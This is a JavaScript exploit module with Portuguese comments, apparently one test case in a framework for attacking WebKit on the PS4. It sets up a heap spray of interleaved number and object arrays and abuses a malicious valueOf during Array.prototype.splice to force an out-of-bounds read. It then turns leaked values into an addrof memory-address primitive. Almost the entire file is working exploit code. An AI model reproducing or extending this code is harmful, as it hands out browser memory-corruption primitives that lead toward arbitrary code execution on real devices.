export default {
    id:       'ARRAY_BUTTERFLY_SPLICE_OOB',
    category: 'Exploit',
    risk:     'CRITICAL',
    description:
        'Primitiva addrof via Interleaving (Alinhamento Lado-a-Lado). Abandona o Aliasing ' +
        'para evitar a segregação do bmalloc. Intercala Arrays Numéricos e Arrays de Objetos ' +
        'para garantir que a leitura OOB do vetor corrompido acerte num ponteiro nativo vizinho.',

    setup: function() {
        this.results = {};
        
        // A nossa cobaia
        this.targetObj = document.createElement('div');
        this.targetObj.id = "HOLY_GRAIL";

        // HEAP FENG SHUI: O "Mil-Folhas" (Interleaving)
        this.spray = [];
        for (let i = 0; i < 1500; i++) {
            // Criamos uma gaveta de 4 números
            let numArr = [1.11, 2.22, 3.33, 4.44];
            
            // Colada a ela, criamos uma gaveta de 4 objetos
            let objArr = [this.targetObj, this.targetObj, this.targetObj, this.targetObj];
            
            this.spray.push({ num: numArr, obj: objArr });
        }

        // Escolhemos um array numérico no meio da "sanduíche" para ser o nosso alvo
        this.vulnArray = this.spray[750].num;

        const self = this;
        this.evilObject = {
            valueOf: function() {
                // O GATILHO: Enganamos o splice para encolher o array e descalibrar a Butterfly
                self.vulnArray.length = 0;
                return 0; 
            }
        };
    },

    trigger: function() {
        try {
            // Dispara a bomba. O WebKit tenta ler o evilObject, corrompe o array e escreve 9.99
            this.vulnArray.splice(this.evilObject, 0, 9.99);
            
            // O GOLPE: O vulnArray acha que tem tamanho 0, mas a sua memória física está corrompida.
            // Vamos forçar a leitura fora dos limites (índices 0 até 15).
            // Em algum destes índices, a memória do array vizinho (objArr) começa!
            this.results.leakedData = [];
            for (let i = 0; i < 15; i++) {
                this.results.leakedData.push(this.vulnArray[i]);
            }
        } catch(e) {
            this.results.error = e.message;
        }
    },

    probe: [
        s => s.results.error || 'Splice Executado - Sondando Vizinhos',
        
        // O Extrator addrof
        s => {
            if (s.results.leakedData) {
                // Vamos analisar cada pedaço de lixo que a memória nos devolveu
                for (let i = 0; i < s.results.leakedData.length; i++) {
                    let val = s.results.leakedData[i];
                    
                    // Se encontrarmos um número que não é os nossos canários
                    if (typeof val === 'number' && val !== 1.11 && val !== 2.22 && val !== 3.33 && val !== 4.44 && val !== 9.99 && val !== 0 && !isNaN(val)) {
                        
                        const buf = new ArrayBuffer(8);
                        const f64 = new Float64Array(buf);
                        const u64 = new BigUint64Array(buf);
                        
                        f64[0] = val;
                        const bits = u64[0];
                        
                        const addr = bits & 0x0000FFFFFFFFFFFFn;
                        
                        // Verifica se o ponteiro é fisicamente coerente com o Userspace da PS4
                        if (addr > 0x100000n && addr < 0x7FFFFFFFFFFFn) {
                            return `🏆 ADDROF [OOB Lado-a-Lado]: 0x${addr.toString(16).toUpperCase()} no índice [${i}]`;
                        }
                    }
                }
            }
            return 0; // Falhou, tenta no próximo ciclo
        }
    ],

    cleanup: function() {
        this.vulnArray = null;
        this.evilObject = null;
        this.targetObj = null;
        this.spray = null;
        this.results = {};
    }
};
